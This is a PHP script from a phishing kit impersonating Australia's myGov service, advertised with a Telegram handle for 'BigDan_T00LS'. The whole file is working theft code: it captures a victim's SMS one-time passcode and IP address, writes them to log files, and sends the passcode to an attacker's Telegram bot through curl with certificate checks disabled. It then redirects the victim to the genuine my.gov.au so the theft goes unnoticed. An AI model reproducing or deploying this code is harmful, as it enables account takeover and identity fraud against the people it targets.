<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀⠀t.me/BigDan_T00LS⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀  wa.me/message/MIEE56RRIQU5C1
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/



include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";


include "../../admin/config.php";
$chatId = trim(file_get_contents("../../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../../admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("../../admin/config/discord.ini"));
extract($_REQUEST);
$file1 = fopen("../../results/logins.txt", "a");
fwrite($file1, $otpanswer2 );
fwrite($file1, "\n");
fclose($file1);

$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$file = fopen("Mygov.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$file1 = fopen("../../results/logins.txt", "a");


fwrite($file1,"[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] ". "\n");
fwrite($file1, " ##### ONLINE ACCESSS 🔐 #### ". "\n");
fwrite($file1, "> SMS 1: ");
fwrite($file1, $otpanswer2. "\n");
fwrite($file1, " ##### ENDS HERE 🔐#### ". "\n");
fwrite($file1,"[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] ". "\n");

fwrite($file1, "\n");
fclose($file1);

$SMS3 = $_POST["otpanswer2"];



$data = "[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] \n $message 
< FULLZ  I N F O >🔐\n > SMS 3: $SMS3 \n ";

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}





HEADER("Location: https://my.gov.au/");







?>

